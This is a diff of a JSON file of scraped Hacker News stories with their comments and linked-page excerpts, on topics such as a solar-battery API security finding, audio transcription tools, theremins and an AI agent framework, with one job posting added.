-      "Yeah, this is pretty much what I did, except the demo account had an employee's email address in the details so I knew the format.\n \nreply"
-    ],
-    "link": "https://rya.nc/vpp-hack.html",
-    "first_paragraph": "rya.ncRyan Castellucci\u2019s blogI recently had solar panels and a battery storage system from GivEnergy installed at my house. A major selling point for me was that they have a local network API which can be used to monitor and control everything without relying on their cloud services. My plan is to set up Home Assistant and integrate it with that, but in the meantime, I decided to let it talk to the cloud. I set up some scheduled charging, then started experimenting with the API.The next evening, I had control over a virtual power plant comprised of tens of thousands of grid connected batteries.When I went to generate an API token, I was pleasantly surprised to find options for expiration time and fine-grained control over permissions. I clicked \u201cgenerate\u201d, and got:From the eyJ prefix, I recognized a base64 encoded JSON object. Upon closer inspection, it turned out to be two JSON objects and some binary data, separated by periods:More precisely, a JSON Web Token (JWT) signed with an RSA"
-  },
-  {
-    "title": "OTranscribe: A free and open tool for transcribing audio interviews (otranscribe.com)",
-    "points": 386,
-    "submitter": "zerojames",
-    "submit_time": "2024-08-09T07:31:15",
-    "num_comments": 91,
-    "comments_url": "https://news.ycombinator.com/item?id=41199567",
-    "comments": [
-      "I needed to do this this week (transcribe an interview with multiple speakers) and used https://github.com/MahmoudAshraf97/whisper-diarizationWorked excellent.It generates both a file that just contains a line per uninterrupted speaker speech prefixed with the speaker number, as well as a file with timestamps which I believe would be used as subtitles.\n \nreply",
-      "I have had very good results using Spectropic [1], a hosted Whisper Diarization API service as a platform. I found it cheap and way easier and faster than setting up and using whisper-diarization on my M1. Audiogest [2] is a web service built upon Spectropic, I have not yet used it.disclaimer : I am not affiliated in any way, just a happy customer! I had some nice mail exchanges after bug reports with the (I believe solo-)developer behind these tools.---[1] https://spectropic.ai/[2] https://audiogest.app/\n \nreply",
-      "Thanks for the shout-out and kind words!Thomas here, maker of Spectropic and Audiogest. I am indeed focused on building a simple and reliable Whisper + diarization API. Also working on providing fine-tuned versions of Whisper of non-English languages through the API.Feel free to reach out to me if anyone is interested in this!\n \nreply",
-      "Hi! Any plans to support streaming transcription with diarization?\n \nreply",
-      "Great looking API. Are you able to, or do you have plans, for there to be automatic speaker identification based on labeled samples of their voices? It would be great to basically have a library of known speakers that are auto matched when transcribing\n \nreply",
-      "Thanks! That is something I might offer in the future and is definitely possible with a library like pyannote. Would be really cool to add for sure.I am also experimenting with post-processing transcripts with LLMs to infer speaker names from a transcript. It works pretty decent already but it's still a bit expensive. I have this feature available under the 'enhanced' model if you want to check it out: https://docs.spectropic.ai/models/transcribe/enhanced\n \nreply",
-      "The problem with using OpenAI whisper is that its too slow on CPU only machines. Whisper.CPP is blazing fast compared to Whisper and I wish people build better diarization on top of that.\n \nreply",
-      "Another advantage of Whisper.CPP is that it can use cublas to accelerate models too large for your GPU memory; I can run the medium and large models with cublas on my 1050, but only the small if I use the pure GPU mode.\n \nreply",
-      "What's OpenAI Whisper vs whisper.cpp? Do you mean whisper-diarization uses the API?\n \nreply",
-      "https://github.com/openai/whispervshttps://github.com/ggerganov/whisper.cppThey are two inference engines for running the whisper ASR model, each with their own API AFAIK.\n \nreply"
-    ],
-    "link": "https://otranscribe.com/",
-    "first_paragraph": "A free web app to take the pain out of transcribing recorded interviews.As featured on\n Follow @oTranscribe\n\nCreated by\nElliot Bentley.\n                A project of the MuckRock Foundation.\n            \n\nPrivacy policy\nEnter your transcript here...\u00a0\u00a0Protips:\u00a0- Ctrl+I adds italic formatting and Ctrl+B adds bold formatting.- Press ESC to play/pause, and Ctrl+J to insert the current timestamp.\n\n"
-  },
-  {
-    "title": "Jerk (ivanish.ca)",
-    "points": 176,
-    "submitter": "surprisetalk",
-    "submit_time": "2024-08-04T17:10:23",
-    "num_comments": 25,
-    "comments_url": "https://news.ycombinator.com/item?id=41154895",
-    "comments": [
-      "I enjoyed reading that!> I haven\u2019t seen anyone do a shrinking game.While I'm also not aware of a shrinking game, there are more than a few[1] growing games. Some aspects of the mechanic are the same - \"what was dangerous before is not a problem now and vice versa\"; it's just the plot that changes.So: in a shrinking game a small enemy will become a large threat and a narrow passage will become a large escape route - and in a growing game a large enemy will turn into a small threat and a previously large passage will become inaccessible.[1]: E.g. https://en.wikipedia.org/wiki/Katamari_Damacy\n \nreply",
-      "There was a game called Specter Spelunker Shrinks that required arbitrary shrinking and growing. It's more of a prototype than a full game, but I could imagine this exact mechanic working in a more fleshed out setting.A cool thing about the game is that time also scales with size. So the challenge provided by moving objects also scales with the character's size (sometimes beneficially, sometimes not).https://www.youtube.com/watch?v=NZ65SWBb1Kg\n \nreply",
-      "It's not exactly either a shrinking or growing game but maybe a bit of both: https://en.wikipedia.org/wiki/Superliminal.(Ostensibly, in a growing game you get bigger as the game progresses and vice versa for a shrinking game; this lets one play with perspective to make things bigger or smaller as needed.)\n \nreply",
-      "A wonderful example of fictional use of scale is Greg Egan's sci-fi novel \"Scale\" https://a.co/d/8t2LLwk .It also touches on the real thorny issues of metabolism, heat transfer, and density, aside from the obvious geometry and ergonomic concerns.\n \nreply",
-      "Reminds me of a proposal I've seen floating around for a Metroidvania game where you lose abilities as you progress (never gaining them back.)IIRC the idea is that it would still be a game with progressive exploration (if not necessarily Metroidvania-style exploration), as terrain-navigation-gated area design would be combined with more-mainstream keys-and-locks area design \u2014 so while you're losing your abilities that allow you to \"sneak in through the back door\" of areas, you're gaining key items/flipping switches/making friends that enable you to \"come in through the front door\" instead.Also, as with a \"shrinking game\", you'd see things you're currently \"too powerful\" to enter and need to come back when you're \"weaker.\" In this case, because some abilities you start with would be too powerful \u2014 trading that power off for having too little precision/finesse \u2014 and so would be preventing you from entering some areas because every time you try to do so, the ability kicks in and pushes you past the gap you were trying to fit into (or whatever.) It's only once you lose the ability that you gain the precision required to aim for the gap.\n \nreply",
-      "> Metroidvania game where you lose abilities as you progressThis is brilliant. It solves the inherent tension of metroidvanias wanting both ever-increasing power and ever-increasing challenge. Rather than unlocking new areas, each time you lose abilities, it changes your relationship to existing areas. But the knowledge you gain \u2014 room layouts, enemy placement, hazards, short cuts, etc \u2014 becomes way more helpful when you can't just fly (perhaps literally) across the map.\n \nreply",
-      "This idea is really interesting to me but it seems like it would be hard to capture a similar kind of fun as progressing in a traditional metroidvania. That there is a trade-off between player movement abilities and map shortcuts is interesting enough to warrant a purchase (big fan of the genre, personally) but \"100%\" saves and the like could possibly be un-fun to make.Although, I'm already imagining a sequence where you trade away your last movement ability and walk down some long-ish path to a place where you get all or most of them back (or different ones!). That could be fun and rewarding but it would definitely have to be done right.\n \nreply",
-      "Seems very unlikely to work. Most metroidvania mechanics are not \"useful\", they're just \"required\" like barrier breakers or hazard resistances. Players don't actually care about having the latter. Taking away the ability open orange doors isn't really different from introducing new purple doors that you can't open.The tech that is useful, like dashes and double jumps, is really nice to have but not especially interesting to lose imo. If you \"need\" the dash then it's just a key. If you don't need the dash then losing it is just less satisfying movement.\n \nreply",
-      "Baba is You does this by giving you a bunch of tools to solve a level, then taking away one of them (or neutering it) and challenging you to solve it again as an Extra.It's fun because it makes you realize that you already had the power for a more a different solution, but didn't notice.\n \nreply",
-      "My boss and a long time good friend developed one[1] with his previous indie studio. Originally VR but playable with mouse and keyboard too, player can shrink both themselves and their enemies.(Not trying to advertise for sales as the company went under years ago)[1]https://store.steampowered.com/app/754850/The_Spy_Who_Shrunk...\n \nreply"
-    ],
-    "link": "https://ivanish.ca/jerk/",
-    "first_paragraph": "If you\u2019d like, you can listen to an audio version of this page. It includes all the contextually relevant bits of music, and a few ad libs not included in the text. But it doesn\u2019t include the links and images, naturally.In 2010 I quit my job to make indie games.My childhood friend Sterling had just finished studying comp sci at university, and I\u2019d talked him out of going straight into the industry. Big teams, no autonomy, no vision.He was a graphics programming savant, deeply specialized, and I could do all the other stuff. Together, we were T-shaped. We had a shared appreciation for weird, innovative games. And we each had some savings.This was before Steam Greenlight. Before Indie Game: The Movie. The paint was still drying on the App Store. The iPad was new and nobody knew what to do with it. Maybe this big portable screen would be a great canvas for games. Hell, any day now, Flash should come to iOS. But if it doesn\u2019t, Unity seems promising, if a little restrictive.It feels like in"
-  },
-  {
-    "title": "Qlot: Common Lisp Library Manager (github.com/fukamachi)",
-    "points": 46,
-    "submitter": "ducktective",
-    "submit_time": "2024-08-06T05:04:04",
-    "num_comments": 22,
-    "comments_url": "https://news.ycombinator.com/item?id=41167921",
-    "comments": [
-      "xxx"
-    ],
-    "link": "https://github.com/fukamachi/qlot",
-    "first_paragraph": "We read every piece of feedback, and take your input very seriously.\n            To see all available qualifiers, see our documentation.\n          \n        A project-local library installer for Common Lisp\n      \nQlot (pronounced ky\u00fc-'l\u00e4t, like culotte) is a project-local library installer using Quicklisp facility. This aims to be like Bundler of Ruby or Carton of Perl.We have Quicklisp, the central library registry. It made installation of libraries damn easy.However, what only you can specify is the month of distribution. Which means you have to use all libraries of the same moment and you cannot use a newer/older version of a library for your project.\"local-projects/\" or ASDF configurations may be a solution to this problem, but there are a couple of problems.They are not project-local. If you have multiple projects that use different versions of the same library, it would be a problem.They are difficult to fix the version or to update them. If your project needs to work on other th"
-  },
-  {
-    "title": "Voice is a garden: Margaret Watts Hughes's Victorian sound visualizations (themarginalian.org)",
-    "points": 33,
-    "submitter": "benbreen",
-    "submit_time": "2024-08-09T19:21:21",
-    "num_comments": 4,
-    "comments_url": "https://news.ycombinator.com/item?id=41204622",
-    "comments": [
-      "Somewhat related: resonance figures formed by a vibrating plate, https://americanhistory.si.edu/science/chladni.htm\n \nreply",
-      "That site is dated. Even the video won't play because it uses flash\n \nreply",
-      "In fairness they do have a YouTube link below the video itself so that there exists another way to watch it.\n \nreply",
-      "Cymatics is my spirit frequency!While I know a fair-enough-surface-level stuff about Cymatics, I really seek the day where I can focus on it more in depth.What I really love about Cymatic patterns that represent certain frequencies is that they have been seen throughout history in architectural reliefs and carvings.such as the famous rosslyn chapel:https://www.tokenrock.com/cymatics/rosslyn-chapel-cubes/---In a famous, meta-physical series of Tomes \"Life and teaching of the masters of the far east\" - there is a great part about the team of Baird T Spalding addressing a cliffside with a group of monks of some sort. There is a large flat stone that the group assembles on, then the monks form a half circle around the stone, and facing the cliffside, they chant and have some sort of horns which they blow a certain tonal frequency that bounces from the cliff face into the stone they are on, and the frequency resonates to levitate the stone up the cliff to hte temple they are seeking.(read it in 1992, so deep pull from memory)https://www.youtube.com/watch?v=588pfqtMtz0There are the biblical versions on Trumpet and Walls falling - and other sound-based stories of yore.We doing sonic surgery etc...And as Tesla famously says 3/69/ - if you want to understand the universe, understand frequency.===Movement and MeasureTime expressed through frequencyAll is vibration\n \nreply"
-    ],
-    "link": "https://www.themarginalian.org/2024/08/08/margaret-watts-hughes-voice-figures/",
-    "first_paragraph": ""
-  },
-  {
-    "title": "Show HN: Personal Interactive Cantonese Dictionary (ctang.art)",
-    "points": 19,
-    "submitter": "ctangy",
-    "submit_time": "2024-08-09T21:33:18",
-    "num_comments": 0,
-    "comments_url": "",
-    "comments": [
-      "xxx"
-    ],
-    "link": "https://nomenclature.ctang.art",
-    "first_paragraph": ""
-  },
-  {
-    "title": "VisiCalc \u2013 The Early Days (2003) (benlo.com)",
-    "points": 52,
-    "submitter": "hggh",
-    "submit_time": "2024-08-06T14:25:35",
-    "num_comments": 8,
-    "comments_url": "https://news.ycombinator.com/item?id=41171142",
-    "comments": [
-      "xxx"
-    ],
-    "link": "https://benlo.com/visicalc/",
-    "first_paragraph": "\n\r\nOn April 8, 2003, Dan Bricklin, Bob Frankston, and Mitch Kapor gathered with Charles Simonyi to\r\nspeak about the Origins and Impact of VisiCalc.\r\nThis got me thinking about those early days and my own first encounters with the program.\r\nBy the summer of 1978,\r\nMicrochess was available on all of the popular personal computers of the day, the S-100 bus machines,\r\nthe TRS-80 and the Commodore PET. Micro-Ware had a booth at PC-78 in Atlantic City and the cassettes were\r\nflying off the table. Carl Helmers, editor of Byte Magazine, came by and introduced me to someone I should meet\r\nbecause \u201cwe have a lot in common\u201d. This turned out to be Dan Fylstra, at the time, an MBA student at Harvard, a writer for Byte,\r\nand a 6800 programmer. I didn't remember at the time, but later I discovered that Dan had been the third person to order Microchess for the Kim-1 when it was announced in 1976.\r\nDan and I had lunch together and he told me about Personal Software, his small company distributing progr"
-  },
-  {
-    "title": "Infinite Proofs: The Effects of Mathematics on David Foster Wallace (2012) (lareviewofbooks.org)",
-    "points": 58,
-    "submitter": "lordleft",
-    "submit_time": "2024-08-09T16:55:14",
-    "num_comments": 21,
-    "comments_url": "https://news.ycombinator.com/item?id=41203509",
-    "comments": [
-      "Here is the book on Infinity DFW penned: https://www.amazon.com/Everything-More-Compact-History-Infin...\n \nreply",
-      "I'm surprised by the mathematician's critiques of this book. I have a PhD in math and I read this book about 10 years ago now. I loved it. I'm sure there are some inaccuracies, but he gets the overall story correct. There's enough math in the book to be engaging for someone mathematically trained. There's also a lot more history than if you read a math book that just has proofs. And the book is entertaining in the way that DFW's books usually are. As a former mathematician I highly recommend.\n \nreply",
-      "I agree. The inaccuracies listed are like, once every few pages the author makes a statement like \"P implies Q\" without mentioning some minor condition, like, \"only if you assume the axiom of choice\". Yes, this is annoying for mathematicians, but there's just a fundamental compromise that has to be made. If you spell out every single detail then you will create a book that is not engaging enough to read straight through.I think you will really enjoy this book if, like me, you:1. Enjoy David Foster Wallace's literary style2. Have a good mathematical understanding of set theoryUnfortunately, the intersection of these two conditions might make for a very small target audience!\n \nreply",
-      "I want to note for the HN crowd that the book is in the \"just technical enough to inform yet not scare off the layman, but not technical enough for the practitioner\" nonfiction subgenre. Critically, there are a number of finer details that DFW gets wrong; if you're mathematically inclined and intend to read this, I suggest pairing it with a printed copy of Prabhakar Ragde's errata document hosted by the DFW fansite The Howling Fantods ([1]).[1] https://www.thehowlingfantods.com/dfw/images/enmerrata.pdf\n \nreply",
-      "This. He tries to do a few epsilon delta proofs and completely gets the concept wrong. I\u2019m surprised an editor did not stop this.If he can\u2019t understand a limit it really puts a question mark on whether it\u2019s worth reading his insight into the subject.\n \nreply",
-      "This should be read in parallel with the review by Michael Harris in the AMS Notices: \"A Sometimes Funny Book Supposedly about Infinity\" https://www.ams.org/notices/200406/rev-harris.pdfAs a DFW lover whose day job is as a mathematician... that book's a clunker.\n \nreply",
-      "I feel less-bad about not having finished it now.I was doing fine until formulas started showing up more than very-occasionally. I\u2019m basically dyslexic when equations enter the picture.\n \nreply",
-      "Michael Harris is a great mathematician (number theory, let's go!!), but that review to me is pretty rambling and doesn't point out many inaccuracies in DFW's book, but takes issue with DFW's approach and style or writing. I did just skim the review and am a DFW fanboy, but Harris seems to have issues with books about infinity and math for lay people, which is fine, that's driving his opinions here.I'd imagine there will also be a gap between what mathematician's think of novelists writing and what novelists think of real math. So there's that too.\n \nreply",
-      "Such a great book. Do you know if he there is any other DFW math-ish writings to be found? All my searches thus far have turned up naught.\n \nreply",
-      "I'm not aware of any, but maybe somebody else is.  A more general question is are there any other DFW-ish math-ish writings to be found?  Against The Day (Pynchon) is not really math-ish, but it does have a good bit of math (more than GR at least), and a DFW fan would probably like it.  Stella Maris (McCarthy) is perhaps neither DFW-ish nor math-ish, but it is Serious Fiction centered on a mathematician and is probably the best work of fiction to feature Alexander Grothendieck.  I have heard that Solenoid (Cartarescu) has some math in it, though I fear it's still sitting on my shelf.  Every Arc Bends Its Radian (due in a couple months from Sergio De La Pava) has a math-ish title but I doubt it will actually contain much math.Michael Harris -- a mathematician who wrote a review of the DFW Infinity book -- has a book called \"Mathematics Without Apologies\", which I liked, though it's non-fiction.  There is also \"Birth of a Theorem\" by Fields medalist Cedric Villani which is an interesting read -- not fiction, but it is experimental in many respects and I would say worth a read.\n \nreply"
-    ],
-    "link": "https://lareviewofbooks.org/article/infinite-proofs-the-effects-of-mathematics-on-david-foster-wallace/",
-    "first_paragraph": ""
-  },
-  {
-    "title": "Using the Moon as an Echo [video] (youtube.com)",
-    "points": 45,
-    "submitter": "tws",
-    "submit_time": "2024-08-08T06:47:26",
-    "num_comments": 8,
-    "comments_url": "https://news.ycombinator.com/item?id=41188769",
-    "comments": [
-      "My understanding is that before the development of observation satellites in the 1960s, radio echos from the Moon were used to detect nuclear explosions (testing or military use) from the far side of the Earth.  Even if direct observations were not possible / were limited, so long as the Moon was observable both over the test site and a US-friendly (not necessarily US-based) receiving station, such signals could be detected.The Arecibo\u2019s site origins trace back to the 1950s, when Cornell University proposed its construction to the Department of Defense\u2019s Advanced Research Projects Agency (ARPA), which is today known as the Defense Advanced Research Projects Agency (DARPA). A desire to better understand the composition of the ionosphere and how it might impact objects passing through, including ballistic missile reentry vehicles carrying nuclear warheads, was a key reason for its construction.  At the time, ARPA was in charge of a broad ballistic missile defense program known as Project Defender. It was believed that nuclear warheads would produce a distinct signature when reentering the atmosphere, making it possible to distinguish them from decoys, so long as that signature could be quickly identified and categorized. The plan was to use the Arecibo Telescope to help gather general, but still valuable information about the ionosphere in support of this effort.<https://www.twz.com/37898/collapsed-arecibo-radio-telescope-...>\n \nreply",
-      "What a useful tool that saves me time. My weekend project this week was literally just writing a canon for modular synth that used a moon bounce for the second voice. I figured I could compose it with a delay set to 2.7sec, and then play with the clock via Maths for a performance- but their plugin sounds like this is more complex and interesting.Lunar bounce canons could become an entire form arising from that 2.7sec constraint.\n \nreply",
-      "Oh hey I have that same ham radio! Kenwood TS-2000.  I guess I just need a giant radio telescope...\n \nreply",
-      "A cross polarized Yagi can do EME bounce as well. You need an az/el rotator to track the moon though.\n \nreply",
-      "I was explaining ham radio to my kids last night (something neither teenager had ever heard of), and ran across https://en.wikipedia.org/wiki/Earth\u2013Moon\u2013Earth_communication.\n \nreply",
-      "> radio telescopeFrom the title I thought it might be about using lasers against lunar retroreflectors, passive arrangements of precise mirrors that (usually) reflect light back to its source.https://en.wikipedia.org/wiki/List_of_retroreflectors_on_the...\n \nreply",
-      "This is really cool. A small niche of ham radio operators perform EME (Earth Moon Earth) contacts all the time\n \nreply",
-      "There are also digital modes that use radio scatter and reflections (meteorites, airplanes,....) to communicate \"further\" than line-of-sight allows.It's a quite well know \"ham radio thing\", although it's mostly \"empty\", and few hams actually use those modes.\n \nreply"
-    ],
-    "link": "https://www.youtube.com/watch?v=yxBC6XzuMPs",
-    "first_paragraph": ""
-  },
-  {
-    "title": "What the hell is a luminiferous theremin? (extkits.co.uk)",
-    "points": 27,
-    "submitter": "edent",
-    "submit_time": "2024-08-09T18:49:45",
-    "num_comments": 17,
-    "comments_url": "https://news.ycombinator.com/item?id=41204378",
-    "comments": [
-      "Sounds fun, but meaningless.As with the wide array of VR instruments (that also use highly accurate position tracking as inputs), what it really boils down to is:If you are procedurally generating audio (ie. using a synth) on device then what you have is categorically inferior to using any number of existing synths and virtual synths along with a midi input device (such as the genki wave).Don\u2019t embed the audio generator.Just make it a midi input device.It\u2019s not a thermin. Same way a microphone that emulates a flute when you blow it is not a flute.It\u2019s a synth that can only take one kind of input.Novel input devices are fun, and I like that; people like exploring different ways of expressing themselves in performances\u2026 but I\u2019m a bit skeptical about this.Seems like it\u2019s lost what was special about the theremin.\n \nreply",
-      "What part # is used for the TOF sensors? The PDF schematic shows nothing...\n \nreply",
-      "there are many https://www.adafruit.com/product/3317 those work really well\n \nreply",
-      "... but why the hell would you listen to one?This last question is unfortunately never answered.The theremin is a good example of we made it \"because we can\" instead of \"because we should\".Of course, glad to be proven wrong.\n \nreply",
-      "It certainly is a bit of a novelty, but there are a few Theremin-featuring pieces that I find pleasing, a classic example is the Theremin and piano arrangement of Saint-Saens' The Swan.Here is Clara Rockmore performing it (I think this is a video of the recording on The Art of the Theremin) https://www.youtube.com/watch?v=XdFSU8sn3mo .  There's a very nice arrangement of La vie en rose from the same sessions.She developed a lot of the Theremin techniques and - despite some argument about how practical vs. performative they are - is likely the best Theremin player ever.  She was previously trained as violinist and an answer to why you would _play_ a theremin: her tendinitis killed her violin career but could keep playing music with the force-less theremin.There are also a surprising number of well-known pop (etc.) songs that include a theremin somewhere. Not my list, but I see most of the ones I'm aware of here: https://open.spotify.com/playlist/0p2SpBZ3xDEjemAVlwmWeF?si=...\n \nreply",
-      "> There are also a surprising number of well-known pop (etc.) songs that include a theremin somewhere.There are definitely some strong uses of theremin in there, but after sampling a few I also found some that I don\u2019t think are theremin at all, which makes me wonder if that\u2019s a common theme - whether a good chunk of that list isn\u2019t theremin, but other instruments.For example, Wonderboy (Tenacious D) seems to be using a synth with portamento (aka glide), which is pretty common and does sound a little like theremin while the pitch is sliding, but ultimately gives a very different effect, mostly because when it reaches the target note, it holds the note strongly. Theremin\u2019s effect tends to be disorienting because you can\u2019t hold an exact note, so it\u2019s either sliding around or people use a lot of vibrato.Another one I confirmed is not Theremin is Lovely Head by Goldfrapp. Again, this vaguely sounds like it could be a theremin, but there are plenty of signs it\u2019s either heavily processed and edited, or just not a theremin. My first guess was a guitar under heavy filtering or via MIDI, but then I found this: \u201c What is often mistaken for a theremin synth in the song is, in fact, Alison's vocals manipulated through a Korg MS-20 synthesiser.\u201d https://en.wikipedia.org/wiki/Lovely_Head\n \nreply",
-      "Good Vibrations used something else:https://en.wikipedia.org/wiki/Electro-Theremin\n \nreply",
-      "I can't believe nobody has mentioned the original soundtrack of Marvel's \"Loki\"[0], but that's where I learned the actual name of the instrument. (With more details in the director's interviews eg. [1])[0]: https://youtu.be/watch?v=183tEhupiSQ[1]: https://www.indiewire.com/features/general/loki-theremin-nat...\n \nreply",
-      "I thought The Day The Earth Stood Still used it to good effect[1], even if the Theramin=UFO has since become cliche.1: https://www.youtube.com/watch?v=utuDgREIS7Q\n \nreply",
-      "Neutral Milk Hotel uses the theramin to great effect in their music. https://www.youtube.com/watch?v=1FeD16vu_qQ\n \nreply"
-    ],
-    "link": "https://extkits.co.uk/what-the-hell-is-a-luminiferous-theremin/",
-    "first_paragraph": "The Theremin was created by Leon Theremin (Lev Sergeyevich Termen) around October 1920 after noticing that a high frequency oscillators would change their frequency when a hand (or other object) was brought close to them. He added a circuit to make this change audible as a change in pitch of audio tone.After demonstrating his ability to play notes and music on this device that he initially called the etherphone but over time became to be known as a Theremin.Theremin music is heard usually as an accompaniment in many 1960\u2019s and 1970 songs, but it\u2019s most popular use was probably in horror or Science fiction films. The Theremin  had two ariels each with its own high frequency oscillator, one (usually the ariel sticking up) controls the pitch and the other (usually out to the side) controls the volume. The two ariels are set at 90 degrees to each other to reduce the possibility that the signal from one could affect the other. The Theremin works as the proximity of the users hand changes th"
-  },
-  {
-    "title": "VFusion3D: Learning Scalable 3D Generative Models from Video Diffusion Models (github.com/facebookresearch)",
-    "points": 19,
-    "submitter": "MrTrvp",
-    "submit_time": "2024-08-09T19:55:42",
-    "num_comments": 4,
-    "comments_url": "https://news.ycombinator.com/item?id=41204881",
-    "comments": [
-      "I tried a few samples, I feel that its quality is not as good as stable fast 3d.\n \nreply",
-      "I'm guessing this paper is more about \"It's neat that this works at all.\" rather than trying to improve on the state of the art.\n \nreply",
-      "Interesting that they compare to totally different models than Stable Fast 3D\u2019s paper. I\u2019m not clear on relative size of VFusion3D vs Stable Fast 3D, but I do think the training idea is good and novel \u2014 getting relatively good quality out of movies is a much easier ask in terms of collecting training data than getting 3D model renderings.\n \nreply",
-      "https://arxiv.org/abs/2403.12034\n \nreply"
-    ],
-    "link": "https://github.com/facebookresearch/vfusion3d",
-    "first_paragraph": "We read every piece of feedback, and take your input very seriously.\n            To see all available qualifiers, see our documentation.\n          \n        [ECCV 2024] Code for VFusion3D: Learning Scalable 3D Generative Models from Video Diffusion Models\n      Project page, Paper link, HF DemoVFusion3D is a large, feed-forward 3D generative model trained with a small amount of 3D data and a large volume of synthetic multi-view data. It is the first work exploring scalable 3D generative/reconstruction models as a step towards a 3D foundation.VFusion3D: Learning Scalable 3D Generative Models from Video Diffusion Models\nJunlin Han, Filippos Kokkinos, Philip Torr\nGenAI, Meta and TVG, University of Oxford\nEuropean Conference on Computer Vision (ECCV), 2024We provide a simple installation script that, by default, sets up a conda environment with Python 3.8.19, PyTorch 2.3, and CUDA 12.1. Similar package versions should also work.Run the inference script to get 3D assets.You may specify which"
-  },
-  {
-    "title": "A heck of a wild bug chase (georgemauer.net)",
-    "points": 42,
-    "submitter": "togakangaroo",
-    "submit_time": "2024-08-08T17:17:19",
-    "num_comments": 18,
-    "comments_url": "https://news.ycombinator.com/item?id=41193922",
-    "comments": [
-      "xxx"
-    ],
-    "link": "https://georgemauer.net/2024/08/01/a-heck-of-a-wild-bug-chase.html",
-    "first_paragraph": "I just tracked down a bug with more twists, turns, and interconnecting weirdness than I\u2019ve seen in years - maybe ever. I feel like I\u2019m going to be telling the story of Olympic-level Bug-Chase-2024 for years, and I feel compelled to write about it. To be clear, the following is a streamlined retelling. I\u2019m omitting the twists, turns and dead-ends that abounded.Also, now is a good time to mention that I just coincidentally got laid off in a \u201cReduction in Force\u201d, want to hire me?!First, some context. (Commence handwaving) Some time ago, our tech team received a request to create a way of showcasing graduates of our workforce training program on a job board. Because this was scheduled for only a pilot and we were already committed to a lot of other work, I recommended a relatively simple NextJs application thrown up on Vercel and secured by Auth0. As we were outside of our AWS infrastructure and this was meant to be just for a small-scale pilot, I didn\u2019t want to deal with databases. Again,"
-  },
-  {
-    "title": "Show HN: Nous \u2013 Open-Source Agent Framework with Autonomous, SWE Agents, WebUI (github.com/trafficguard)",
-    "points": 82,
-    "submitter": "campers",
-    "submit_time": "2024-08-09T14:16:09",
-    "num_comments": 22,
-    "comments_url": "https://news.ycombinator.com/item?id=41202064",
-    "comments": [
-      "If this isn't by Nous Research, may want to consider renaming (https://x.com/NousResearch, https://nousresearch.com/)\n \nreply",
-      "I can confirm this is not a projected related to Nous Research in any way, just an unfortunate naming collision\n \nreply",
-      "Nous is the french word for \"us\". haven't heard of NousResearch\n \nreply",
-      "but they explain it is from the greek nous which fits better for ai\n \nreply",
-      "And if it is is by Nous Research we there definitely needs to be clearer branding as this is very confusing.If OP is not Nous Research (which I suspect to be the case) then a name change is a must as they're already a fairly well established company in the LLM space (surprised OP isn't aware of the name collision already). It's a bit similar to creating a new library with the \"Smiling Face with Open Hands emoji\"[0] as your logo0. https://emojipedia.org/hugging-face\n \nreply",
-      "When I first picked the name, after a chat with Claude, I hadn't come across Nous Research back then, and they didn't show up Googling for just nous.I see a bit of reuse of words in other various llm related projects.Langchain/langfuse/langflowLlama/ollama/llamaindexso I hadn't been too worried about it when became aware of them.That's what Show HN is for, getting feedback, and a name changed now would be easy before I post it around more.\n \nreply",
-      "Never heard of you\n \nreply",
-      "I'm not affiliated with Nous Research in anyway, but do work in the LLM space and at least in this community it's a fairly well known org. Since this project also is in that space I was just adding support for parent's observation.\n \nreply",
-      "This looks fantastic! I've been using aider and had my own scripts to automate some things with it, but this looks next level and beyond.I wanted to try this out (specifically the web UI), so I configured the env file, adjusted the docker compose file, ran `docker compose up` and it \"just works\".It would be great if there was a basic agent example or two pre-configured, so you can set this up and instantly get a better sense of how everything works from a more hands-on perspective.\n \nreply",
-      "This looks too good. I have a B2B AI product, the features that exist in Nous easily outclass anything I could make in a reasonable timeline.Maybe I should rewrite my app using Nous...\n \nreply"
-    ],
-    "link": "https://github.com/TrafficGuard/nous",
-    "first_paragraph": "We read every piece of feedback, and take your input very seriously.\n            To see all available qualifiers, see our documentation.\n          \n        TypeScript AI agent platform with Autonomous agents, Software developer agents, AI code review agents and more\n      \n\n\nThe open-source TypeScript platform for autonomous AI agents and LLM based workflows \nHome |  Setup | Observability | Function calling |\nAutonomous AI Agent | AI Software Engineer | AI Code reviews |\nTools/Integrations | RoadmapThe Nous Story | Features | UI Examples | Code examples | ContributingNous started from a simple goal: to harness AI's potential to enhance real-world productivity, born in DevOps and Platform Engineering space. We envisioned a tool that could:At TrafficGuard we process billions of events a month for our global clients, increasing their ad spend ROI by protecting against bots and other forms of invalid traffic.\nOur SaaS on GCP comprises projects developed in TypeScript, Python, GoogleSQL, PH"
+    "link": "https://gist.github.com/bluepnume/8f2376b0893bc6b85564e7359359ecd4",
+    "first_paragraph": "\n        Instantly share code, notes, and snippets.\n      We're OneText, a YC backed (Winter '23) startup in the Bay Area, and we're looking for a lead Fullstack Typescript/Node Engineerhttps://onetextfullstackeng.paperform.coWe're growing faster than we can manage! Since raising our seed round last year, we've:So: join us if you like the idea of a startup environment that is fast paced, but in a sustainable way. There are no shortage of fun engineering challenges and new things to learn. But we always want to be deliberate and smart about what we decide to build, and not just race from one thing to the next.Email any questions to: engjobs@onetext.comThis is the general job description for all engineers at OneTextFor this role specifically, here's what we're looking for:You'll be working across the full stack, from our React front-end to our Node apis and workers, to our Postgres/Mongo/Redis database layers.You should be great at TypeScript, and a fast enough learner to figure out any "
   }
 ]
